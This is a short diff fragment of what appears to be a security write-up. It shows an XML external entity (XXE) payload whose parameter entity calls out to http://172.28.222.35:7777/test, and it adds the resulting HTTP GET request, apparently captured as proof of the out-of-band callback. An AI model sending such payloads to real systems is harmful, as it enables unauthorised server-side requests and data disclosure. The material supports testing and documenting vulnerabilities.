@@ -38,3 +38,9 @@ Date: 2026-01-05
 <!DOCTYPE root [<!ENTITY % sky SYSTEM "http://172.28.222.35:7777/test"> %sky;]>
 ```
 
+```bash
+GET /test HTTP/1.0
+Host: 172.28.222.35:7777
+Connection: close
+```
+
